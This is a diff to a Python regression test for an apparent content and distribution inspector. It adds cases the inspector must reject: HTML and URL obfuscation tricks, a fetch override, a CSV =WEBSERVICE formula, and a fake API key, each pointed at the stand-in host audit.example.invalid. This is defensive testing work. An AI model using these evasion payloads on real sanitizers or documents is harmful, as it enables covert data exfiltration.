@@ -32,6 +32,7 @@ code_examples = {
     'concatenated URL': 'fetch("https:" + "//audit.example.invalid/collect")',
     'license hostname used for fetch': "fetch('https://github.com/collect')",
     'computed URL': "fetch(String.fromCharCode(47,47)+'audit.example.invalid/collect')",
+    'native fetch fallback': "window.fetch = (...args) => saved(args) || nativeFetch(...args)",
     'comment-only protection': "/* XMLHttpRequest sendBeacon serviceWorker WebSocket replace(navigator, 'geolocation', undefined) */",
 }
 for name, code in code_examples.items():
@@ -43,6 +44,9 @@ payloads = {
     'traversal image': '<img src="../other/collect.png">',
     'encoded traversal': '<img src="%2e%2e/other/collect.png">',
     'protocol-relative image': '<img src="//audit.example.invalid/x">',
+    'area backslash': '<area href="/\\audit.example.invalid/x">',
+    'entity URL': '<img src="&#47;&#47;audit.example.invalid/x">',
+    'control character URL': '<area href="https:\n//audit.example.invalid/x">',
     'SVG external reference': '<svg><use xlink:href="//audit.example.invalid/x"/></svg>',
     'second srcset': '<img srcset="brand.svg 1x, //audit.example.invalid/x 2x">',
     'inline event': '<button onclick="fetch(\'//audit.example.invalid/x\')">test</button>',
@@ -53,6 +57,14 @@ payloads = {
 }
 for name, payload in payloads.items():
     rejects('content: ' + name, lambda p=payload: Inspector(policy).walk({'payload': p}, 'test.json'))
+
+for name, value in {
+    'fake credential': {'api_key': 'sk_live_' + 'FAKEFORAUDITONLY1234567890'},
+    'invalid PDF': {'contentType':'application/pdf','bodyBase64':base64.b64encode(b'not a PDF').decode()},
+    'invalid PDF Base64': {'contentType':'application/pdf','bodyBase64':'%%%%'},
+    'CSV formula': {'contentType':'text/csv','body':'name,value\ntest,=WEBSERVICE("//audit.example.invalid/")'},
+}.items():
+    rejects('content: ' + name, lambda v=value: Inspector(policy).walk(v, 'response.json'))
 
 writer = PdfWriter()
 writer.add_blank_page(width=300, height=300)
@@ -78,6 +90,13 @@ with tempfile.TemporaryDirectory(prefix='sukimakun-regression-') as temp:
         changed = json.loads(original); changed['auditProbe'] = payload
         target.write_text(json.dumps(changed))
         rejects('distribution: ' + name, lambda: check_distribution(clone))
+    target.write_bytes(original)
+    target = clone / 'programs.bin'; original = target.read_bytes()
+    changed = json.loads(gzip.decompress(original)); key = next(iter(changed['scripts']))
+    changed['scripts'][key] = code_examples['concatenated URL']
+    target.write_bytes(gzip.compress(json.dumps(changed).encode()))
+    rejects('programs bundle content independent of inventory', lambda: Inspector(policy).walk(changed, 'programs.bin'))
+    rejects('programs bundle distribution', lambda: check_distribution(clone))
     target.write_bytes(original)
     rogue = clone / 'rogue.js'; rogue.write_text('fetch("//audit.example.invalid/")')
     rejects('unlisted public file', lambda: check_distribution(clone)); rogue.unlink()
